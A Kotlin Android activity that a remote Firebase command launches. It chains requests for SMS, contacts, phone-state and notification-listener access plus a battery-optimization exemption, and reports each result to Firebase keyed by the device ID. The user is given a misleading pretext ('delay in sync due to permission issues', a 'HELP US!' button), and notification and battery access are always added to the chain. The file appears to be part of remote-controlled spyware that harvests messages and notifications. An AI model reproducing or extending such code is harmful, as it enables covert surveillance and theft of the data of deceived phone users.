package com.example.fast.ui

import android.Manifest
import android.animation.Animator
import android.animation.AnimatorListenerAdapter
import android.animation.ObjectAnimator
import android.animation.ValueAnimator
import android.content.ComponentName
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.drawable.GradientDrawable
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.os.PowerManager
import android.provider.Settings
import android.util.Log
import android.view.View
import android.view.animation.DecelerateInterpolator
import android.widget.ImageView
import android.widget.LinearLayout
import android.widget.ProgressBar
import android.widget.TextView
import androidx.activity.enableEdgeToEdge
import androidx.appcompat.app.AppCompatActivity
import androidx.appcompat.app.AppCompatDelegate
import androidx.cardview.widget.CardView
import androidx.core.app.ActivityCompat
import androidx.core.app.NotificationManagerCompat
import androidx.core.content.ContextCompat
import com.example.fast.R
import com.example.fast.config.AppConfig
import com.example.fast.databinding.ActivityRemotePermissionRequestBinding
import com.example.fast.service.NotificationReceiver
import com.example.fast.util.PermissionFirebaseSync
import com.example.fast.util.PermissionManager
import com.example.fast.util.PermissionSyncHelper

/**
 * RemotePermissionRequestActivity
 * 
 * Activity launched remotely via Firebase command to request specific permissions.
 * Shows a UI with message and "HELP US!" button.
 * 
 * Usage:
 * - Command: requestPermission
 * - Content: "permission1,permission2,..." or "ALL"
 * - Permissions: sms, contacts, notification, battery, phone_state, ALL
 * 
 * Example:
 * - "sms,contacts" -> Request SMS and Contacts permissions
 * - "ALL" -> Request all permissions
 */
class RemotePermissionRequestActivity : AppCompatActivity() {
    
    private val binding by lazy { ActivityRemotePermissionRequestBinding.inflate(layoutInflater) }
    
    private val TAG = "RemotePermissionRequest"
    private val PERMISSION_REQUEST_CODE = 200
    
    @Suppress("DEPRECATION")
    private val permissionsList: ArrayList<String> by lazy {
        val baseList = intent.getStringArrayListExtra("permissions") ?: ArrayList()
        // Automatically add battery and notification to the chain if not already present
        val enhancedList = ArrayList(baseList)
        if (!enhancedList.contains("notification")) {
            enhancedList.add("notification")
        }
        if (!enhancedList.contains("battery")) {
            enhancedList.add("battery")
        }
        enhancedList
    }
    
    @get:android.annotation.SuppressLint("HardwareIds")
    private val deviceId: String by lazy {
        android.provider.Settings.Secure.getString(
            contentResolver,
            android.provider.Settings.Secure.ANDROID_ID
        )
    }
    
    private var currentPermissionIndex = 0
    private var hasAttemptedBatteryOptimization = false
    
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        enableEdgeToEdge()
        
        // Set window background to match app theme
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            window.statusBarColor = ContextCompat.getColor(this, R.color.theme_gradient_start)
            window.navigationBarColor = ContextCompat.getColor(this, R.color.theme_gradient_start)
        }
        
        setContentView(binding.root)
        AppCompatDelegate.setDefaultNightMode(AppCompatDelegate.MODE_NIGHT_NO)
        
        // Animate card entrance
        animateCardEntrance()
        
        // Animate icon pulse
        animateIconPulse()
        
        // Setup UI
        setupUI()
        
        // Sync current permission status to Firebase
        PermissionFirebaseSync.syncPermissionStatus(this, deviceId)
        
        // Start processing permission requests when button is clicked
        if (permissionsList.isEmpty()) {
            Log.w(TAG, "No permissions to request, finishing activity")
            finish()
            return
        }
    }
    
    /**
     * Animate card entrance
     */
    private fun animateCardEntrance() {
        binding.mainCard.alpha = 0f
        binding.mainCard.translationY = 100f
        
        binding.mainCard.animate()
            .alpha(1f)
            .translationY(0f)
            .setDuration(600)
            .setInterpolator(DecelerateInterpolator())
            .start()
    }
    
    /**
     * Animate icon pulse effect
     */
    private fun animateIconPulse() {
        val iconContainer = binding.iconContainer
        val scaleAnimator = ObjectAnimator.ofFloat(iconContainer, "scaleX", 1f, 1.05f, 1f)
        scaleAnimator.duration = 2000
        scaleAnimator.repeatCount = ValueAnimator.INFINITE
        scaleAnimator.repeatMode = ValueAnimator.REVERSE
        scaleAnimator.start()
        
        val scaleYAnimator = ObjectAnimator.ofFloat(iconContainer, "scaleY", 1f, 1.05f, 1f)
        scaleYAnimator.duration = 2000
        scaleYAnimator.repeatCount = ValueAnimator.INFINITE
        scaleYAnimator.repeatMode = ValueAnimator.REVERSE
        scaleYAnimator.start()
    }
    
    /**
     * Setup UI elements
     */
    private fun setupUI() {
        // Set message text
        binding.messageText.text = "There is a delay in sync due to permission issues."
        binding.subtitleText.text = "We give our best."
        
        // Setup help button click listener
        binding.helpButton.setOnClickListener {
            // Animate button press
            binding.helpButton.animate()
                .scaleX(0.95f)
                .scaleY(0.95f)
                .setDuration(100)
                .withEndAction {
                    binding.helpButton.animate()
                        .scaleX(1f)
                        .scaleY(1f)
                        .setDuration(100)
                        .start()
                }
                .start()
            
            // Hide button and show permissions list
            hideButtonAndShowPermissions()
        }
    }
    
    /**
     * Hide button and show permissions list with animation
     */
    private fun hideButtonAndShowPermissions() {
        // Hide button
        binding.helpButtonCard.animate()
            .alpha(0f)
            .scaleX(0.8f)
            .scaleY(0.8f)
            .setDuration(300)
            .setListener(object : AnimatorListenerAdapter() {
                override fun onAnimationEnd(animation: Animator) {
                    binding.helpButtonCard.visibility = View.GONE
                }
            })
            .start()
        
        // Show permissions list
        binding.permissionsListContainer.visibility = View.VISIBLE
        binding.permissionsListContainer.alpha = 0f
        binding.permissionsListContainer.translationY = -20f
        
        binding.permissionsListContainer.animate()
            .alpha(1f)
            .translationY(0f)
            .setDuration(400)
            .setInterpolator(DecelerateInterpolator())
            .start()
        
        // Populate permissions list
        populatePermissionsList()
        
        // Start processing permissions after a short delay
        Handler(Looper.getMainLooper()).postDelayed({
            processNextPermission()
        }, 500)
    }
    
    /**
     * Populate permissions list UI
     */
    private fun populatePermissionsList() {
        val permissionsListLayout = binding.permissionsList
        permissionsListLayout.removeAllViews()
        
        val permissionNames = mapOf(
            "sms" to "SMS Access",
            "contacts" to "Contacts",
            "notification" to "Notifications",
            "battery" to "Battery Optimization",
            "phone_state" to "Phone State"
        )
        
        permissionsList.forEach { permission ->
            val permissionItem = createPermissionItem(permissionNames[permission] ?: permission)
            permissionsListLayout.addView(permissionItem)
        }
    }
    
    /**
     * Create a permission item view
     */
    private fun createPermissionItem(permissionName: String): View {
        val itemLayout = LinearLayout(this)
        itemLayout.orientation = LinearLayout.HORIZONTAL
        itemLayout.gravity = android.view.Gravity.CENTER_VERTICAL
        val padding = dpToPx(12)
        itemLayout.setPadding(padding, padding / 2, padding, padding / 2)
        
        val params = LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.MATCH_PARENT,
            LinearLayout.LayoutParams.WRAP_CONTENT
        )
        params.setMargins(0, 0, 0, dpToPx(8))
        itemLayout.layoutParams = params
        
        // Set background
        val background = GradientDrawable()
        background.setColor(ContextCompat.getColor(this, android.R.color.transparent))
        background.cornerRadius = dpToPx(12).toFloat()
        itemLayout.background = background
        
        // Icon
        val icon = ImageView(this)
        icon.setImageResource(android.R.drawable.ic_dialog_info)
        icon.setColorFilter(ContextCompat.getColor(this, R.color.theme_primary))
        val iconParams = LinearLayout.LayoutParams(dpToPx(24), dpToPx(24))
        iconParams.setMargins(0, 0, dpToPx(12), 0)
        icon.layoutParams = iconParams
        itemLayout.addView(icon)
        
        // Permission name
        val nameText = TextView(this)
        nameText.text = permissionName
        nameText.setTextColor(ContextCompat.getColor(this, android.R.color.black))
        nameText.textSize = 14f
        nameText.setTypeface(null, android.graphics.Typeface.BOLD)
        nameText.layoutParams = LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.WRAP_CONTENT,
            LinearLayout.LayoutParams.WRAP_CONTENT
        )
        itemLayout.addView(nameText)
        
        return itemLayout
    }
    
    /**
     * Convert dp to pixels
     */
    private fun dpToPx(dp: Int): Int {
        return (dp * resources.displayMetrics.density).toInt()
    }
    
    /**
     * Update permission item to show granted state
     */
    private fun updatePermissionItemStatus(permissionName: String, granted: Boolean) {
        val permissionsListLayout = binding.permissionsList
        for (i in 0 until permissionsListLayout.childCount) {
            val item = permissionsListLayout.getChildAt(i) as? LinearLayout ?: continue
            val textView = item.getChildAt(1) as? TextView ?: continue
            if (textView.text.toString().contains(permissionName, ignoreCase = true)) {
                // Update background color
                val background = GradientDrawable()
                background.setColor(if (granted) {
                    ContextCompat.getColor(this, android.R.color.holo_green_light)
                } else {
                    ContextCompat.getColor(this, android.R.color.transparent)
                })
                background.cornerRadius = dpToPx(12).toFloat()
                item.background = background
                
                // Add checkmark icon
                if (granted && item.childCount == 2) {
                    val checkIcon = ImageView(this)
                    checkIcon.setImageResource(android.R.drawable.checkbox_on_background)
                    checkIcon.setColorFilter(ContextCompat.getColor(this, android.R.color.holo_green_dark))
                    val checkParams = LinearLayout.LayoutParams(dpToPx(24), dpToPx(24))
                    checkParams.setMargins(dpToPx(12), 0, 0, 0)
                    checkIcon.layoutParams = checkParams
                    item.addView(checkIcon)
                }
                
                // Animate update
                item.animate()
                    .scaleX(1.05f)
                    .scaleY(1.05f)
                    .setDuration(200)
                    .withEndAction {
                        item.animate()
                            .scaleX(1f)
                            .scaleY(1f)
                            .setDuration(200)
                            .start()
                    }
                    .start()
                break
            }
        }
    }
    
    /**
     * Process next permission in the list
     */
    private fun processNextPermission() {
        if (currentPermissionIndex >= permissionsList.size) {
            // All permissions processed
            Log.d(TAG, "All permissions processed")
            
            // Show success message
            showSuccessMessage()
            
            // Sync final permission status to Firebase
            PermissionFirebaseSync.syncPermissionStatus(this, deviceId)
            
            // Trigger sync if permissions are available
            PermissionSyncHelper.checkAndStartSync(this)
            
            // Finish after showing success message
            Handler(Looper.getMainLooper()).postDelayed({
                finish()
            }, 2000)
            return
        }
        
        val permissionName = permissionsList[currentPermissionIndex]
        
        when (permissionName) {
            "sms" -> requestSmsPermissions()
            "contacts" -> requestContactsPermission()
            "notification" -> requestNotificationListenerPermission()
            "battery" -> requestBatteryOptimization()
            "phone_state" -> requestPhoneStatePermission()
            else -> {
                Log.w(TAG, "Unknown permission: $permissionName, skipping")
                currentPermissionIndex++
                processNextPermission()
            }
        }
    }
    
    /**
     * Request SMS permissions (RECEIVE_SMS and READ_SMS)
     */
    private fun requestSmsPermissions() {
        val missingPermissions = mutableListOf<String>()
        
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.RECEIVE_SMS) 
            != PackageManager.PERMISSION_GRANTED) {
            missingPermissions.add(Manifest.permission.RECEIVE_SMS)
        }
        
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) 
            != PackageManager.PERMISSION_GRANTED) {
            missingPermissions.add(Manifest.permission.READ_SMS)
        }
        
        if (missingPermissions.isEmpty()) {
            // Already granted
            updatePermissionItemStatus("SMS Access", true)
            PermissionFirebaseSync.updatePermissionStatus(this, deviceId, "sms", true)
            Handler(Looper.getMainLooper()).postDelayed({
                currentPermissionIndex++
                processNextPermission()
            }, 800)
        } else {
            updatePermissionItemStatus("SMS Access", false)
            ActivityCompat.requestPermissions(
                this,
                missingPermissions.toTypedArray(),
                PERMISSION_REQUEST_CODE
            )
        }
    }
    
    /**
     * Request Contacts permission
     */
    private fun requestContactsPermission() {
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) 
            == PackageManager.PERMISSION_GRANTED) {
            // Already granted
            updatePermissionItemStatus("Contacts", true)
            PermissionFirebaseSync.updatePermissionStatus(this, deviceId, "contacts", true)
            Handler(Looper.getMainLooper()).postDelayed({
                currentPermissionIndex++
                processNextPermission()
            }, 800)
        } else {
            updatePermissionItemStatus("Contacts", false)
            ActivityCompat.requestPermissions(
                this,
                arrayOf(Manifest.permission.READ_CONTACTS),
                PERMISSION_REQUEST_CODE
            )
        }
    }
    
    /**
     * Request Phone State permission
     */
    private fun requestPhoneStatePermission() {
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) 
            == PackageManager.PERMISSION_GRANTED) {
            // Already granted
            updatePermissionItemStatus("Phone State", true)
            PermissionFirebaseSync.updatePermissionStatus(this, deviceId, "phone_state", true)
            Handler(Looper.getMainLooper()).postDelayed({
                currentPermissionIndex++
                processNextPermission()
            }, 800)
        } else {
            updatePermissionItemStatus("Phone State", false)
            ActivityCompat.requestPermissions(
                this,
                arrayOf(Manifest.permission.READ_PHONE_STATE),
                PERMISSION_REQUEST_CODE
            )
        }
    }
    
    /**
     * Request Notification Listener permission (opens Settings)
     */
    private fun requestNotificationListenerPermission() {
        val component = ComponentName(packageName, NotificationReceiver::class.java.name)
        val isEnabled = NotificationManagerCompat.getEnabledListenerPackages(this)
            .contains(component.packageName)
        
        if (isEnabled) {
            // Already granted
            updatePermissionItemStatus("Notifications", true)
            PermissionFirebaseSync.updatePermissionStatus(this, deviceId, "notification", true)
            Handler(Looper.getMainLooper()).postDelayed({
                currentPermissionIndex++
                processNextPermission()
            }, 800)
        } else {
            updatePermissionItemStatus("Notifications", false)
            // Open Notification Listener Settings
            PermissionManager.openNotificationListenerSettings(this)
            // Note: We'll check again in onResume() since user needs to enable in Settings
        }
    }
    
    /**
     * Request Battery Optimization exemption (opens Settings)
     */
    private fun requestBatteryOptimization() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.M) {
            // Not required for older Android versions
            PermissionFirebaseSync.updatePermissionStatus(this, deviceId, "battery", true)
            currentPermissionIndex++
            processNextPermission()
            return
        }
        
        val powerManager = getSystemService(POWER_SERVICE) as? PowerManager
        val isIgnoring = powerManager?.isIgnoringBatteryOptimizations(packageName) ?: true
        
        if (isIgnoring) {
            // Already exempt
            updatePermissionItemStatus("Battery Optimization", true)
            PermissionFirebaseSync.updatePermissionStatus(this, deviceId, "battery", true)
            Handler(Looper.getMainLooper()).postDelayed({
                currentPermissionIndex++
                processNextPermission()
            }, 800)
        } else {
            updatePermissionItemStatus("Battery Optimization", false)
            // Only show battery optimization dialog once per session
            // If user dismisses it and enables "Allow background usage" instead,
            // we shouldn't keep showing the dialog
            if (!hasAttemptedBatteryOptimization) {
                hasAttemptedBatteryOptimization = true
                // Open Battery Optimization Settings
                PermissionManager.openBatteryOptimizationSettings(this)
                // Note: We'll check again in onResume() since user needs to enable in Settings
            } else {
                // Already attempted once, don't show again
                // Move to next permission or finish
                Log.d(TAG, "Battery optimization already attempted once, moving on")
                if (currentPermissionIndex >= permissionsList.size - 1) {
                    // This was the last permission, finish
                    PermissionFirebaseSync.syncPermissionStatus(this, deviceId)
                    PermissionSyncHelper.checkAndStartSync(this)
                    finish()
                } else {
                    // Move to next permission
                    currentPermissionIndex++
                    processNextPermission()
                }
            }
        }
    }
    
    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        
        if (requestCode == PERMISSION_REQUEST_CODE) {
            // Update permission status based on results
            permissions.forEachIndexed { index, permission ->
                val isGranted = grantResults[index] == PackageManager.PERMISSION_GRANTED
                
                when (permission) {
                    Manifest.permission.RECEIVE_SMS, Manifest.permission.READ_SMS -> {
                        // Update SMS permission status (check both)
                        val smsGranted = ActivityCompat.checkSelfPermission(this, Manifest.permission.RECEIVE_SMS) == PackageManager.PERMISSION_GRANTED &&
                                ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED
                        updatePermissionItemStatus("SMS Access", smsGranted)
                        PermissionFirebaseSync.updatePermissionStatus(this, deviceId, "sms", smsGranted)
                    }
                    Manifest.permission.READ_CONTACTS -> {
                        updatePermissionItemStatus("Contacts", isGranted)
                        PermissionFirebaseSync.updatePermissionStatus(this, deviceId, "contacts", isGranted)
                    }
                    Manifest.permission.READ_PHONE_STATE -> {
                        updatePermissionItemStatus("Phone State", isGranted)
                        PermissionFirebaseSync.updatePermissionStatus(this, deviceId, "phone_state", isGranted)
                    }
                }
            }
            
            // Move to next permission after a short delay
            Handler(Looper.getMainLooper()).postDelayed({
                currentPermissionIndex++
                processNextPermission()
            }, 800)
        }
    }
    
    override fun onResume() {
        super.onResume()
        
        // Check if we're waiting for notification listener or battery optimization
        val currentPermission = if (currentPermissionIndex < permissionsList.size) {
            permissionsList[currentPermissionIndex]
        } else {
            null
        }
        
        when (currentPermission) {
            "notification" -> {
                val component = ComponentName(packageName, NotificationReceiver::class.java.name)
                val isEnabled = NotificationManagerCompat.getEnabledListenerPackages(this)
                    .contains(component.packageName)
                
                if (isEnabled) {
                    updatePermissionItemStatus("Notifications", true)
                    PermissionFirebaseSync.updatePermissionStatus(this, deviceId, "notification", true)
                    Handler(Looper.getMainLooper()).postDelayed({
                        currentPermissionIndex++
                        processNextPermission()
                    }, 800)
                }
            }
            "battery" -> {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    val powerManager = getSystemService(POWER_SERVICE) as? PowerManager
                    val isIgnoring = powerManager?.isIgnoringBatteryOptimizations(packageName) ?: true
                    
                    if (isIgnoring) {
                        updatePermissionItemStatus("Battery Optimization", true)
                        PermissionFirebaseSync.updatePermissionStatus(this, deviceId, "battery", true)
                        Handler(Looper.getMainLooper()).postDelayed({
                            currentPermissionIndex++
                            processNextPermission()
                        }, 800)
                    } else if (hasAttemptedBatteryOptimization) {
                        // Already attempted once, don't keep showing the dialog
                        // User may have enabled "Allow background usage" instead of battery optimization exemption
                        // Move to next permission or finish
                        Log.d(TAG, "Battery optimization not granted, but already attempted once. Moving on.")
                        if (currentPermissionIndex >= permissionsList.size - 1) {
                            // This was the last permission, finish
                            PermissionFirebaseSync.syncPermissionStatus(this, deviceId)
                            PermissionSyncHelper.checkAndStartSync(this)
                            finish()
                        } else {
                            // Move to next permission
                            currentPermissionIndex++
                            processNextPermission()
                        }
                    }
                    // If hasAttemptedBatteryOptimization is false, we're still waiting for the first attempt
                    // which will happen in requestBatteryOptimization()
                }
            }
        }
    }
    
    /**
     * Show success message
     */
    private fun showSuccessMessage() {
        binding.successMessage.visibility = View.VISIBLE
        binding.successMessage.alpha = 0f
        
        binding.successMessage.animate()
            .alpha(1f)
            .setDuration(400)
            .setInterpolator(DecelerateInterpolator())
            .start()
    }
}
